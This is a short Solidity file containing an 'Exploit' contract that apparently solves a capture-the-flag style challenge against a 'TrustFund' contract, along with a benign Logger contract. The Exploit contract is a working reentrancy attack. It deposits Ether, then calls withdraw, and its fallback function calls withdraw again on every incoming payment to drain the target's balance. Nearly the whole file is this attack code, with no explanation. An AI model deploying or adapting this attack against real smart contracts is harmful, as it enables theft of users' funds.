// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.20 <0.5;
import "hardhat/console.sol";
//import "TrustFund.sol";

contract Exploit{
    TrustFund target;

    constructor (address _tar) public payable{
        target = TrustFund(_tar);
        target.deposit.value(msg.value)();
        //target.deposit.value(1e17)();
    } 

    function tyrIt() public payable{
        target.withdraw(5e17);
    }

    function () public payable{
        target.withdraw(2e17);
    }

    function getBalnce() public view returns (uint256){
        return this.balance;
    }


}

interface TrustFund{
  function deposit() external payable returns (bool);
  function withdraw(uint256 _amount) external;
}

contract Logger {
  struct Message {
    address sender;
    uint256 amount;
    string note;
  }

  Message[] History;
  Message public LastLine;

  function LogTransfer(address _sender, uint256 _amount, string memory _note) public {
    LastLine.sender = _sender;
    LastLine.amount = _amount;
    LastLine.note = _note;
    History.push(LastLine);
  }
}